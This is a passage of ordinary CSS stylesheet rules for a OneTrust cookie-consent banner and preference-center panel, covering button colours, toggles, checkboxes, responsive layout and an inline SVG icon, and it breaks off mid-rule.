        #onetrust-banner-sdk .ot-b-addl-desc *,
        #onetrust-banner-sdk .ot-gv-list-handler * {
            line-height: inherit;
            font-size: inherit;
            margin: 0
        }

        #onetrust-banner-sdk .ot-gv-list-handler {
            padding: 0;
            border: 0;
            height: auto;
            width: auto
        }

        #onetrust-banner-sdk .ot-b-addl-desc {
            display: block
        }

        #onetrust-banner-sdk #onetrust-button-group-parent {
            padding: 15px 30px;
            text-align: center
        }

        #onetrust-banner-sdk #onetrust-button-group-parent:not(.has-reject-all-button) #onetrust-button-group {
            text-align: right
        }

        #onetrust-banner-sdk #onetrust-button-group {
            text-align: center;
            display: inline-block;
            width: 100%
        }

        #onetrust-banner-sdk #onetrust-reject-all-handler,
        #onetrust-banner-sdk #onetrust-pc-btn-handler {
            margin-right: 1em
        }

        #onetrust-banner-sdk #onetrust-pc-btn-handler {
            border: 1px solid #6cc04a;
            max-width: 45%
        }

        #onetrust-banner-sdk .banner-actions-container {
            float: right;
            width: 50%
        }

        #onetrust-banner-sdk #onetrust-pc-btn-handler.cookie-setting-link {
            background-color: #fff;
            border: none;
            color: #6cc04a;
            text-decoration: underline;
            padding-left: 0;
            padding-right: 0
        }

        #onetrust-banner-sdk #onetrust-accept-btn-handler,
        #onetrust-banner-sdk #onetrust-reject-all-handler,
        #onetrust-banner-sdk #onetrust-pc-btn-handler {
            background-color: #6cc04a;
            color: #fff;
            border-color: #6cc04a;
            min-width: 135px;
            padding: 12px 10px;
            letter-spacing: .05em;
            line-height: 1.4;
            font-size: .813em;
            font-weight: 600;
            height: auto;
            white-space: normal;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler {
            float: left;
            max-width: calc(40% - 18px)
        }

        #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler.cookie-setting-link {
            text-align: left;
            margin-right: 0
        }

        #onetrust-banner-sdk .has-reject-all-button .banner-actions-container {
            max-width: 60%;
            width: auto
        }

        #onetrust-banner-sdk .ot-close-icon {
            width: 44px;
            height: 44px;
            background-size: 12px;
            margin: -18px -18px 0 0;
            border: none;
            display: inline-block;
            padding: 0
        }

        #onetrust-banner-sdk #onetrust-close-btn-container {
            position: absolute;
            right: 24px;
            top: 24px
        }

        #onetrust-banner-sdk .banner_logo {
            display: none
        }

        #onetrust-banner-sdk #banner-options {
            float: left;
            padding: 0 30px;
            width: calc(100% - 90px)
        }

        #onetrust-banner-sdk .banner-option {
            margin-bottom: 10px
        }

        #onetrust-banner-sdk .banner-option-input {
            cursor: pointer;
            width: auto;
            height: auto;
            border: none;
            padding: 0;
            padding-right: 3px;
            margin: 0 0 6px;
            font-size: .82em;
            line-height: 1.4
        }

        #onetrust-banner-sdk .banner-option-input * {
            pointer-events: none;
            font-size: inherit;
            line-height: inherit
        }

        #onetrust-banner-sdk .banner-option-input[aria-expanded=true] .ot-arrow-container {
            transform: rotate(90deg)
        }

        #onetrust-banner-sdk .banner-option-input[aria-expanded=true]~.banner-option-details {
            height: auto;
            display: block
        }

        #onetrust-banner-sdk .banner-option-header {
            cursor: pointer;
            display: inline-block
        }

        #onetrust-banner-sdk .banner-option-header:first-child {
            color: dimgray;
            font-weight: bold;
            float: left
        }

        #onetrust-banner-sdk .ot-arrow-container,
        #onetrust-banner-sdk .banner-option-details {
            transition: all 300ms ease-in 0s;
            -webkit-transition: all 300ms ease-in 0s;
            -moz-transition: all 300ms ease-in 0s;
            -o-transition: all 300ms ease-in 0s
        }

        #onetrust-banner-sdk .ot-arrow-container {
            display: inline-block;
            border-top: 6px solid transparent;
            border-bottom: 6px solid transparent;
            border-left: 6px solid dimgray;
            margin-left: 10px;
            vertical-align: middle
        }

        #onetrust-banner-sdk .banner-option-details {
            display: none;
            font-size: .83em;
            line-height: 1.5;
            height: 0px;
            padding: 10px 10px 5px 10px
        }

        #onetrust-banner-sdk .banner-option-details * {
            font-size: inherit;
            line-height: inherit;
            color: dimgray
        }

        #onetrust-banner-sdk .ot-dpd-container {
            float: left;
            margin: 0 30px 10px 30px
        }

        #onetrust-banner-sdk .ot-dpd-title {
            font-weight: bold;
            padding-bottom: 10px
        }

        #onetrust-banner-sdk .ot-dpd-title {
            font-size: 1em;
            line-height: 1.4
        }

        #onetrust-banner-sdk .ot-dpd-desc {
            font-size: .813em;
            line-height: 1.5;
            margin-bottom: 0
        }

        #onetrust-banner-sdk .ot-dpd-desc * {
            margin: 0
        }

        #onetrust-banner-sdk .onetrust-vendors-list-handler {
            display: block;
            margin-left: 0px;
            margin-top: 5px;
            padding: 0;
            margin-bottom: 0;
            border: 0;
            line-height: normal;
            height: auto;
            width: auto
        }

        #onetrust-banner-sdk:not(.ot-dpd-desc)>.ot-b-addl-desc {
            float: left;
            margin: 0 30px 10px 30px
        }

        #onetrust-banner-sdk .ot-dpd-desc>.ot-b-addl-desc {
            margin-top: 10px;
            margin-bottom: 10px;
            font-size: 1em;
            line-height: 1.5;
            float: none
        }

        #onetrust-banner-sdk #onetrust-policy-text a {
            font-weight: bold;
            margin-left: 5px
        }

        #onetrust-banner-sdk.ot-close-btn-link #onetrust-close-btn-container {
            top: 15px;
            transform: none;
            right: 15px
        }

        #onetrust-banner-sdk.ot-close-btn-link #onetrust-close-btn-container button {
            padding: 0;
            white-space: pre-wrap;
            border: none;
            height: auto;
            line-height: 1.5;
            text-decoration: underline;
            font-size: .75em
        }

        #onetrust-banner-sdk.ot-close-btn-link.ot-wo-title #onetrust-group-container {
            margin-top: 20px
        }

        @media only screen and (max-width: 425px) {
            #onetrust-banner-sdk #onetrust-accept-btn-handler,
            #onetrust-banner-sdk #onetrust-reject-all-handler,
            #onetrust-banner-sdk #onetrust-pc-btn-handler {
                width: 100%;
                margin-bottom: 10px
            }
            #onetrust-banner-sdk #onetrust-pc-btn-handler,
            #onetrust-banner-sdk #onetrust-reject-all-handler {
                margin-right: 0
            }
            #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler.cookie-setting-link {
                text-align: center
            }
            #onetrust-banner-sdk .banner-actions-container,
            #onetrust-banner-sdk #onetrust-pc-btn-handler {
                width: 100%;
                max-width: none
            }
            #onetrust-banner-sdk.otCenterRounded {
                left: 0;
                width: 95%;
                top: 50%;
                transform: translateY(-50%);
                -webkit-transform: translateY(-50%)
            }
        }

        @media only screen and (max-width: 600px) {
            #onetrust-banner-sdk .ot-sdk-container {
                width: auto;
                padding: 0
            }
            #onetrust-banner-sdk #onetrust-policy-title {
                padding: 0 22px 10px 22px
            }
            #onetrust-banner-sdk #onetrust-policy-text,
            #onetrust-banner-sdk:not(.ot-dpd-desc)>.ot-b-addl-desc,
            #onetrust-banner-sdk .ot-dpd-container {
                margin: 0 22px 10px 22px;
                width: calc(100% - 44px)
            }
            #onetrust-banner-sdk #onetrust-button-group-parent {
                padding: 15px 22px
            }
            #onetrust-banner-sdk #banner-options {
                padding: 0 22px;
                width: calc(100% - 44px)
            }
            #onetrust-banner-sdk .banner-option {
                margin-bottom: 6px
            }
            #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler {
                float: none;
                max-width: 100%
            }
            #onetrust-banner-sdk .has-reject-all-button .banner-actions-container {
                width: 100%;
                text-align: center;
                max-width: 100%
            }
            #onetrust-banner-sdk.ot-close-btn-link #onetrust-group-container {
                margin-top: 20px
            }
        }

        @media only screen and (min-width: 426px)and (max-width: 896px) {
            #onetrust-banner-sdk.otCenterRounded {
                left: 0;
                top: 15%;
                transform: translateY(-13%);
                -webkit-transform: translateY(-13%);
                max-width: 600px;
                width: 95%
            }
        }

        #onetrust-consent-sdk #onetrust-banner-sdk {
            background-color: #FFFFFF;
        }

        #onetrust-consent-sdk #onetrust-policy-title,
        #onetrust-consent-sdk #onetrust-policy-text,
        #onetrust-consent-sdk .ot-b-addl-desc,
        #onetrust-consent-sdk .ot-dpd-desc,
        #onetrust-consent-sdk .ot-dpd-title,
        #onetrust-consent-sdk #onetrust-policy-text *:not(.onetrust-vendors-list-handler),
        #onetrust-consent-sdk .ot-dpd-desc *:not(.onetrust-vendors-list-handler),
        #onetrust-consent-sdk #onetrust-banner-sdk #banner-options *,
        #onetrust-banner-sdk .ot-cat-header {
            color: #696969;
        }

        #onetrust-consent-sdk #onetrust-banner-sdk .banner-option-details {
            background-color: #E9E9E9;
        }

        #onetrust-consent-sdk #onetrust-banner-sdk a[href],
        #onetrust-consent-sdk #onetrust-banner-sdk a[href] font,
        #onetrust-consent-sdk #onetrust-banner-sdk .ot-link-btn {
            color: #0a77a9;
        }

        #onetrust-consent-sdk #onetrust-accept-btn-handler,
        #onetrust-banner-sdk #onetrust-reject-all-handler {
            background-color: #0a77a9;
            border-color: #0a77a9;
            color: #FFFFFF;
        }

        #onetrust-consent-sdk #onetrust-pc-btn-handler,
        #onetrust-consent-sdk #onetrust-pc-btn-handler.cookie-setting-link {
            color: #0a77a9;
            border-color: #0a77a9;
            background-color: #FFFFFF;
        }

        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-accept-btn-handler,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-reject-all-handler,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-pc-btn-handler {
            padding: 7px 20px;
            background-color: #09c !important;
            border-width: 2px;
            border-color: #09c !important;
            border-radius: 5px !important;
            color: #fff !important;
            font-size: 16px !important;
            font-weight: bold !important;
            line-height: 1.2 !important;
            letter-spacing: normal !important
        }

        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-accept-btn-handler:hover,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-reject-all-handler:hover,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-pc-btn-handler:hover,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-accept-btn-handler:focus,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-reject-all-handler:focus,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-pc-btn-handler:focus,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-accept-btn-handler:active,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-reject-all-handler:active,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-pc-btn-handler:active {
            background-color: #0a77a9 !important;
            border-color: #0a77a9 !important;
            color: #fff !important
        }

        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-accept-btn-handler:focus,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-reject-all-handler:focus,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-pc-btn-handler:focus {
            background-color: #09c !important;
            border-color: #09c !important;
            color: #fff !important;
            box-shadow: 0 0 0 3px rgba(0, 153, 204, 0.5) !important;
            outline: none !important
        }

        #onetrust-consent-sdk #onetrust-banner-sdk a[href] {
            margin: 0;
            padding: 0 1px;
            border-radius: 2px;
            color: #0a77a9;
            text-decoration: none
        }

        #onetrust-consent-sdk #onetrust-banner-sdk a[href]:hover {
            color: #036;
            text-decoration: underline
        }

        #onetrust-consent-sdk #onetrust-banner-sdk a[href]:focus {
            box-shadow: 0 0 0 3px rgba(0, 153, 204, 0.5);
            outline: none
        }

        #onetrust-consent-sdk #onetrust-banner-sdk a[href]:visited {
            color: #036;
            text-decoration: none
        }

        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-policy-title {
            font-size: 1.5rem
        }

        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-policy-text,
        #onetrust-consent-sdk #onetrust-banner-sdk .ot-b-addl-desc,
        #onetrust-consent-sdk #onetrust-banner-sdk .ot-gv-list-handler {
            font-size: 0.9rem;
            line-height: 1.3
        }

        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-policy-title,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-policy-text,
        #onetrust-consent-sdk #onetrust-banner-sdk .ot-b-addl-desc,
        #onetrust-consent-sdk #onetrust-banner-sdk .ot-dpd-desc,
        #onetrust-consent-sdk #onetrust-banner-sdk .ot-dpd-title,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-policy-text *:not(.onetrust-vendors-list-handler):not(a),
        #onetrust-consent-sdk #onetrust-banner-sdk .ot-dpd-desc *:not(.onetrust-vendors-list-handler),
        #onetrust-consent-sdk #onetrust-banner-sdk #banner-options *,
        #onetrust-consent-sdk #onetrust-banner-sdk .ot-cat-header {
            color: inherit
        }

        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-accept-btn-handler:hover,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-reject-all-handler:hover,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-pc-btn-handler:hover,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-accept-btn-handler:focus,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-reject-all-handler:focus,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-pc-btn-handler:focus,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-accept-btn-handler:active,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-reject-all-handler:active,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-pc-btn-handler:active {
            opacity: 1 !important
        }

        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-pc-btn-handler.cookie-setting-link {
            background-color: transparent !important;
            border: 2px solid transparent !important;
            color: #0a77a9 !important;
            text-decoration: none !important
        }

        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-pc-btn-handler.cookie-setting-link:hover,
        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-pc-btn-handler.cookie-setting-link:focus {
            color: #036 !important;
            text-decoration: underline !important
        }

        #onetrust-consent-sdk #onetrust-banner-sdk a[href]:visited {
            color: #0a77a9
        }

        #onetrust-consent-sdk #onetrust-banner-sdk #onetrust-policy-text a {
            font-weight: normal
        }

        #onetrust-pc-sdk.otPcCenter {
            overflow: hidden;
            position: fixed;
            margin: 0 auto;
            top: 5%;
            right: 0;
            left: 0;
            width: 40%;
            max-width: 575px;
            min-width: 575px;
            border-radius: 2.5px;
            z-index: 2147483647;
            background-color: #fff;
            -webkit-box-shadow: 0px 2px 10px -3px #999;
            -moz-box-shadow: 0px 2px 10px -3px #999;
            box-shadow: 0px 2px 10px -3px #999
        }

        #onetrust-pc-sdk.otPcCenter[dir=rtl] {
            right: 0;
            left: 0
        }

        #onetrust-pc-sdk.otRelFont {
            font-size: 1rem
        }

        #onetrust-pc-sdk #ot-addtl-venlst .ot-arw-cntr,
        #onetrust-pc-sdk #ot-addtl-venlst .ot-plus-minus,
        #onetrust-pc-sdk .ot-hide-tgl {
            visibility: hidden
        }

        #onetrust-pc-sdk #ot-addtl-venlst .ot-arw-cntr *,
        #onetrust-pc-sdk #ot-addtl-venlst .ot-plus-minus *,
        #onetrust-pc-sdk .ot-hide-tgl * {
            visibility: hidden
        }

        #onetrust-pc-sdk #ot-gn-venlst .ot-ven-item .ot-acc-hdr {
            min-height: 40px
        }

        #onetrust-pc-sdk .ot-pc-header {
            height: 39px;
            padding: 10px 0 10px 30px;
            border-bottom: 1px solid #e9e9e9
        }

        #onetrust-pc-sdk #ot-pc-title,
        #onetrust-pc-sdk #ot-category-title,
        #onetrust-pc-sdk .ot-cat-header,
        #onetrust-pc-sdk #ot-lst-title,
        #onetrust-pc-sdk .ot-ven-hdr .ot-ven-name,
        #onetrust-pc-sdk .ot-always-active {
            font-weight: bold;
            color: dimgray
        }

        #onetrust-pc-sdk .ot-cat-header {
            float: left;
            font-weight: 600;
            font-size: .875em;
            line-height: 1.5;
            max-width: 90%;
            vertical-align: middle
        }

        #onetrust-pc-sdk .ot-always-active-group .ot-cat-header {
            width: 55%;
            font-weight: 700
        }

        #onetrust-pc-sdk .ot-cat-item p {
            clear: both;
            float: left;
            margin-top: 10px;
            margin-bottom: 5px;
            line-height: 1.5;
            font-size: .812em;
            color: dimgray
        }

        #onetrust-pc-sdk .ot-close-icon {
            height: 44px;
            width: 44px;
            background-size: 10px
        }

        #onetrust-pc-sdk #ot-pc-title {
            float: left;
            font-size: 1em;
            line-height: 1.5;
            margin-bottom: 10px;
            margin-top: 10px;
            width: 100%
        }

        #onetrust-pc-sdk #accept-recommended-btn-handler {
            margin-right: 10px;
            margin-bottom: 25px;
            outline-offset: -1px
        }

        #onetrust-pc-sdk #ot-pc-desc {
            clear: both;
            width: 100%;
            font-size: .812em;
            line-height: 1.5;
            margin-bottom: 25px
        }

        #onetrust-pc-sdk #ot-pc-desc a {
            margin-left: 5px
        }

        #onetrust-pc-sdk #ot-pc-desc * {
            font-size: inherit;
            line-height: inherit
        }

        #onetrust-pc-sdk #ot-pc-desc ul li {
            padding: 10px 0px
        }

        #onetrust-pc-sdk a {
            color: #656565;
            cursor: pointer
        }

        #onetrust-pc-sdk a:hover {
            color: #3860be
        }

        #onetrust-pc-sdk label {
            margin-bottom: 0
        }

        #onetrust-pc-sdk #vdr-lst-dsc {
            font-size: .812em;
            line-height: 1.5;
            padding: 10px 15px 5px 15px
        }

        #onetrust-pc-sdk button {
            max-width: 394px;
            padding: 12px 30px;
            line-height: 1;
            word-break: break-word;
            word-wrap: break-word;
            white-space: normal;
            font-weight: bold;
            height: auto
        }

        #onetrust-pc-sdk .ot-link-btn {
            padding: 0;
            margin-bottom: 0;
            border: 0;
            font-weight: normal;
            line-height: normal;
            width: auto;
            height: auto
        }

        #onetrust-pc-sdk #ot-pc-content {
            position: absolute;
            overflow-y: scroll;
            padding-left: 0px;
            padding-right: 30px;
            top: 60px;
            bottom: 110px;
            margin: 1px 3px 0 30px;
            width: calc(100% - 63px)
        }

        #onetrust-pc-sdk .ot-cat-grp .ot-always-active {
            float: right;
            clear: none;
            color: #3860be;
            margin: 0;
            font-size: .813em;
            line-height: 1.3
        }

        #onetrust-pc-sdk .ot-pc-scrollbar::-webkit-scrollbar-track {
            margin-right: 20px
        }

        #onetrust-pc-sdk .ot-pc-scrollbar::-webkit-scrollbar {
            width: 11px
        }

        #onetrust-pc-sdk .ot-pc-scrollbar::-webkit-scrollbar-thumb {
            border-radius: 10px;
            background: #d8d8d8
        }

        #onetrust-pc-sdk input[type=checkbox]:focus+.ot-acc-hdr {
            outline: #000 1px solid
        }

        #onetrust-pc-sdk .ot-pc-scrollbar {
            scrollbar-arrow-color: #d8d8d8;
            scrollbar-darkshadow-color: #d8d8d8;
            scrollbar-face-color: #d8d8d8;
            scrollbar-shadow-color: #d8d8d8
        }

        #onetrust-pc-sdk .save-preference-btn-handler {
            margin-right: 20px
        }

        #onetrust-pc-sdk .ot-pc-refuse-all-handler {
            margin-right: 10px
        }

        #onetrust-pc-sdk #ot-pc-desc .privacy-notice-link {
            margin-left: 0
        }

        #onetrust-pc-sdk .ot-subgrp-cntr {
            display: inline-block;
            clear: both;
            width: 100%;
            padding-top: 15px
        }

        #onetrust-pc-sdk .ot-switch+.ot-subgrp-cntr {
            padding-top: 10px
        }

        #onetrust-pc-sdk ul.ot-subgrps {
            margin: 0;
            font-size: initial
        }

        #onetrust-pc-sdk ul.ot-subgrps li p,
        #onetrust-pc-sdk ul.ot-subgrps li h5 {
            font-size: .813em;
            line-height: 1.4;
            color: dimgray
        }

        #onetrust-pc-sdk ul.ot-subgrps .ot-switch {
            min-height: auto
        }

        #onetrust-pc-sdk ul.ot-subgrps .ot-switch-nob {
            top: 0
        }

        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr {
            display: inline-block;
            width: 100%
        }

        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-txt {
            margin: 0
        }

        #onetrust-pc-sdk ul.ot-subgrps li {
            padding: 0;
            border: none
        }

        #onetrust-pc-sdk ul.ot-subgrps li h5 {
            position: relative;
            top: 5px;
            font-weight: bold;
            margin-bottom: 0;
            float: left
        }

        #onetrust-pc-sdk li.ot-subgrp {
            margin-left: 20px;
            overflow: auto
        }

        #onetrust-pc-sdk li.ot-subgrp>h5 {
            width: calc(100% - 100px)
        }

        #onetrust-pc-sdk .ot-cat-item p>ul,
        #onetrust-pc-sdk li.ot-subgrp p>ul {
            margin: 0px;
            list-style: disc;
            margin-left: 15px;
            font-size: inherit
        }

        #onetrust-pc-sdk .ot-cat-item p>ul li,
        #onetrust-pc-sdk li.ot-subgrp p>ul li {
            font-size: inherit;
            padding-top: 10px;
            padding-left: 0px;
            padding-right: 0px;
            border: none
        }

        #onetrust-pc-sdk .ot-cat-item p>ul li:last-child,
        #onetrust-pc-sdk li.ot-subgrp p>ul li:last-child {
            padding-bottom: 10px
        }

        #onetrust-pc-sdk .ot-pc-logo {
            height: 40px;
            width: 120px;
            display: inline-block
        }

        #onetrust-pc-sdk .ot-pc-footer {
            position: absolute;
            bottom: 0px;
            width: 100%;
            max-height: 160px;
            border-top: 1px solid #d8d8d8
        }

        #onetrust-pc-sdk.ot-ftr-stacked .ot-pc-refuse-all-handler {
            margin-bottom: 0px
        }

        #onetrust-pc-sdk.ot-ftr-stacked #ot-pc-content {
            bottom: 160px
        }

        #onetrust-pc-sdk.ot-ftr-stacked .ot-pc-footer button {
            width: 100%;
            max-width: none
        }

        #onetrust-pc-sdk.ot-ftr-stacked .ot-btn-container {
            margin: 0 30px;
            width: calc(100% - 60px);
            padding-right: 0
        }

        #onetrust-pc-sdk .ot-pc-footer-logo {
            height: 30px;
            width: 100%;
            text-align: right;
            background: #f4f4f4
        }

        #onetrust-pc-sdk .ot-pc-footer-logo a {
            display: inline-block;
            margin-top: 5px;
            margin-right: 10px
        }

        #onetrust-pc-sdk[dir=rtl] .ot-pc-footer-logo {
            direction: rtl
        }

        #onetrust-pc-sdk[dir=rtl] .ot-pc-footer-logo a {
            margin-right: 25px
        }

        #onetrust-pc-sdk .ot-tgl {
            float: right;
            position: relative;
            z-index: 1
        }

        #onetrust-pc-sdk .ot-tgl input:checked+.ot-switch .ot-switch-nob {
            background-color: #cddcf2;
            border: 1px solid #3860be
        }

        #onetrust-pc-sdk .ot-tgl input:checked+.ot-switch .ot-switch-nob:before {
            -webkit-transform: translateX(20px);
            -ms-transform: translateX(20px);
            transform: translateX(20px);
            background-color: #3860be;
            border-color: #3860be
        }

        #onetrust-pc-sdk .ot-tgl input:focus+.ot-switch {
            outline: #000 solid 1px
        }

        #onetrust-pc-sdk .ot-switch {
            position: relative;
            display: inline-block;
            width: 45px;
            height: 25px
        }

        #onetrust-pc-sdk .ot-switch-nob {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #f2f1f1;
            border: 1px solid #ddd;
            transition: all .2s ease-in 0s;
            -moz-transition: all .2s ease-in 0s;
            -o-transition: all .2s ease-in 0s;
            -webkit-transition: all .2s ease-in 0s;
            border-radius: 20px
        }

        #onetrust-pc-sdk .ot-switch-nob:before {
            position: absolute;
            content: "";
            height: 21px;
            width: 21px;
            bottom: 1px;
            background-color: #7d7d7d;
            -webkit-transition: .4s;
            transition: .4s;
            border-radius: 20px
        }

        #onetrust-pc-sdk .ot-chkbox input:checked~label::before {
            background-color: #3860be
        }

        #onetrust-pc-sdk .ot-chkbox input+label::after {
            content: none;
            color: #fff
        }

        #onetrust-pc-sdk .ot-chkbox input:checked+label::after {
            content: ""
        }

        #onetrust-pc-sdk .ot-chkbox input:focus+label::before {
            outline-style: solid;
            outline-width: 2px;
            outline-style: auto
        }

        #onetrust-pc-sdk .ot-chkbox label {
            position: relative;
            display: inline-block;
            padding-left: 30px;
            cursor: pointer;
            font-weight: 500
        }

        #onetrust-pc-sdk .ot-chkbox label::before,
        #onetrust-pc-sdk .ot-chkbox label::after {
            position: absolute;
            content: "";
            display: inline-block;
            border-radius: 3px
        }

        #onetrust-pc-sdk .ot-chkbox label::before {
            height: 18px;
            width: 18px;
            border: 1px solid #3860be;
            left: 0px;
            top: auto
        }

        #onetrust-pc-sdk .ot-chkbox label::after {
            height: 5px;
            width: 9px;
            border-left: 3px solid;
            border-bottom: 3px solid;
            transform: rotate(-45deg);
            -o-transform: rotate(-45deg);
            -ms-transform: rotate(-45deg);
            -webkit-transform: rotate(-45deg);
            left: 4px;
            top: 5px
        }

        #onetrust-pc-sdk .ot-label-txt {
            display: none
        }

        #onetrust-pc-sdk .ot-chkbox input,
        #onetrust-pc-sdk .ot-tgl input {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0
        }

        #onetrust-pc-sdk .ot-arw-cntr {
            float: right;
            position: relative
        }

        #onetrust-pc-sdk .ot-arw-cntr .ot-arw {
            width: 16px;
            height: 16px;
            margin-left: 5px;
            color: dimgray;
            display: inline-block;
            vertical-align: middle;
            -webkit-transition: all 150ms ease-in 0s;
            -moz-transition: all 150ms ease-in 0s;
            -o-transition: all 150ms ease-in 0s;
            transition: all 150ms ease-in 0s
        }

        #onetrust-pc-sdk input:checked~.ot-acc-hdr .ot-arw {
            transform: rotate(90deg);
            -o-transform: rotate(90deg);
            -ms-transform: rotate(90deg);
            -webkit-transform: rotate(90deg)
        }

        #onetrust-pc-sdk input[type=checkbox]:focus+.ot-acc-hdr {
            outline: #000 1px solid
        }

        #onetrust-pc-sdk .ot-tgl-cntr,
        #onetrust-pc-sdk .ot-arw-cntr {
            display: inline-block
        }

        #onetrust-pc-sdk .ot-tgl-cntr {
            width: 45px;
            float: right;
            margin-top: 2px
        }

        #onetrust-pc-sdk #ot-lst-cnt .ot-tgl-cntr {
            margin-top: 10px
        }

        #onetrust-pc-sdk .ot-always-active-subgroup {
            width: auto;
            padding-left: 0px !important;
            top: 3px;
            position: relative
        }

        #onetrust-pc-sdk .ot-label-status {
            padding-left: 5px;
            font-size: .75em;
            display: none
        }

        #onetrust-pc-sdk .ot-arw-cntr {
            margin-top: -1px
        }

        #onetrust-pc-sdk .ot-arw-cntr svg {
            -webkit-transition: all 300ms ease-in 0s;
            -moz-transition: all 300ms ease-in 0s;
            -o-transition: all 300ms ease-in 0s;
            transition: all 300ms ease-in 0s;
            height: 10px;
            width: 10px
        }

        #onetrust-pc-sdk input:checked~.ot-acc-hdr .ot-arw {
            transform: rotate(90deg);
            -o-transform: rotate(90deg);
            -ms-transform: rotate(90deg);
            -webkit-transform: rotate(90deg)
        }

        #onetrust-pc-sdk .ot-arw {
            width: 10px;
            margin-left: 15px;
            transition: all 300ms ease-in 0s;
            -webkit-transition: all 300ms ease-in 0s;
            -moz-transition: all 300ms ease-in 0s;
            -o-transition: all 300ms ease-in 0s
        }

        #onetrust-pc-sdk .ot-vlst-cntr {
            margin-bottom: 0
        }

        #onetrust-pc-sdk .ot-hlst-cntr {
            margin-top: 5px;
            display: inline-block;
            width: 100%
        }

        #onetrust-pc-sdk .category-vendors-list-handler,
        #onetrust-pc-sdk .category-vendors-list-handler+a,
        #onetrust-pc-sdk .category-host-list-handler {
            clear: both;
            color: #3860be;
            margin-left: 0;
            font-size: .813em;
            text-decoration: none;
            float: left;
            overflow: hidden
        }

        #onetrust-pc-sdk .category-vendors-list-handler:hover,
        #onetrust-pc-sdk .category-vendors-list-handler+a:hover,
        #onetrust-pc-sdk .category-host-list-handler:hover {
            color: #1883fd
        }

        #onetrust-pc-sdk .category-vendors-list-handler+a {
            clear: none
        }

        #onetrust-pc-sdk .category-vendors-list-handler+a::after {
            content: "";
            height: 15px;
            width: 15px;
            background-repeat: no-repeat;
            margin-left: 5px;
            float: right;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 511.626 511.627'%3E%3Cg fill='%231276CE'%3E%3Cpath d='M392.857 292.354h-18.274c-2.669 0-4.859.855-6.563 2.573-1.718 1.708-2.573 3.897-2.573 6.563v91.361c0 12.563-4.47 23.315-13.415 32.262-8.945 8.945-19.701 13.414-32.264 13.414H82.224c-12.562 0-23.317-4.469-32.264-13.414-8.945-8.946-13.417-19.698-13.417-32.262V155.31c0-12.562 4.471-23.313 13.417-32.259 8.947-8.947 19.702-13.418 32.264-13.418h200.994c2.669 0 4.859-.859 6.57-2.57 1.711-1.713 2.566-3.9 2.566-6.567V82.221c0-2.662-.855-4.853-2.566-6.563-1.711-1.713-3.901-2.568-6.57-2.568H82.224c-22.648 0-42.016 8.042-58.102 24.125C8.042 113.297 0 132.665 0 155.313v237.542c0 22.647 8.042 42.018 24.123 58.095 16.086 16.084 35.454 24.13 58.102 24.13h237.543c22.647 0 42.017-8.046 58.101-24.13 16.085-16.077 24.127-35.447 24.127-58.095v-91.358c0-2.669-.856-4.859-2.574-6.57-1.713-1.718-3.903-2.573-6.565-2.573z'/%3E%3Cpath d='M506.199 41.971c-3.617-3.617-7.905-5.424-12.85-5.424H347.171c-4.948 0-9.233 1.807-12.847 5.424-3.617 3.615-5.428 7.898-5.428 12.847s1.811 9.233 5.428 12.85l50.247 50.248-186.147 186.151c-1.906 1.903-2.856 4.093-2.856 6.563 0 2.479.953 4.668 2.856 6.571l32.548 32.544c1.903 1.903 4.093 2.852 6.567 2.852s4.665-.948 6.567-2.852l186.148-186.148 50.251 50.248c3.614 3.617 7.898 5.426 12.847 5.426s9.233-1.809 12.851-5.426c3.617-3.616 5.424-7.898 5.424-12.847V54.818c-.001-4.952-1.814-9.232-5.428-12.847z'/%3E%3C/g%3E%3C/svg%3E")
        }

        #onetrust-pc-sdk .back-btn-handler {
            font-size: 1em;
            text-decoration: none
        }

        #onetrust-pc-sdk .back-btn-handler:hover {
            opacity: .6
        }

        #onetrust-pc-sdk #ot-lst-title span {
            display: inline-block;
            word-break: break-word;
            word-wrap: break-word;
            margin-bottom: 0;
            color: #656565;
            font-size: 1em;
            font-weight: bold;
            margin-left: 15px
        }

        #onetrust-pc-sdk #ot-lst-title {
            margin: 10px 0 10px 0px;
            font-size: 1em;
            text-align: left
        }

        #onetrust-pc-sdk #ot-pc-hdr {
